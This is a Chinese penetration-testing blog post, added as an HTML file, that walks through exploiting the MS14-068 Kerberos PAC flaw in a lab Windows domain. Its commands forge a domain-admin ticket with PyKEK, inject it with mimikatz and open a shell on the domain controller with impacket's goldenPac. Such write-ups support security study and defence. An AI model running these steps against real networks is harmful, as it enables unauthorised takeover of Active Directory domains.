@@ -1,0 +1,35 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 域渗透-MS14-068 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="域渗透-MS14-068 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">域渗透-MS14-068</h1><div class="post-time">Aug 22, 2019</div><div class="post-content"><h3><span id="ms14-068">MS14-068</span></h3><p>MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</p>
+<h4><span id="利用方式">利用方式</span></h4><p>攻击流程：</p>
+<p>MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485511263.png" alt="1566485511263"></p>
+<p>一、在域内主机jerry上通过dir来访问域控的共享文件夹，示拒绝访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485577139.png" alt="1566485577139"></p>
+<p>二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。</p>
+<p>参数说明：</p>
+<blockquote>
+<p>-u 域账号+@+域名称，这里是jerry+@+rootkit.org</p>
+<p>-p 为当前用户的密码，即jerry的密码</p>
+<p>-s为jerry的SID值，可以通过whoami/all来获取用户的SID值</p>
+<p>-d为当前域的域控</p>
+</blockquote>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485661082.png" alt="1566485661082"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u sqladmin@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1142 -d OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485702304.png" alt="1566485702304"></p>
+<p>脚本执行成功会在当前目录下生成一个ccache文件。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485729199.png" alt="1566485729199"></p>
+<p>三、使用mimikatz导入生成的ccache文件，导入之前cmd下使用命令klist purge或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485815936.png" alt="1566485815936"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_sqladmin@0day.org.ccache</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485894244.png" alt="1566485894244"></p>
+<p>再次dir访问域控共享就可以成功访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485986373.png" alt="1566485986373"></p>
+<h4><span id="goldenpacexe">goldenPac.exe</span></h4><p>impacket工具包里面的goldenPac.py，这个工具是结合ms14-068加psexec的产物，利用起来十分顺手。</p>
+<p>这里用到的是编译的exe文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe 0day.org/sqladmin:admin!@#45@OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566486417839.png" alt="1566486417839"></p>
+<p>当然此工具不止是得到一个shell，我们甚至可以直接让该域控运行我们上传的程序。</p>
+<p>这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。</p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/域渗透-SPN.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
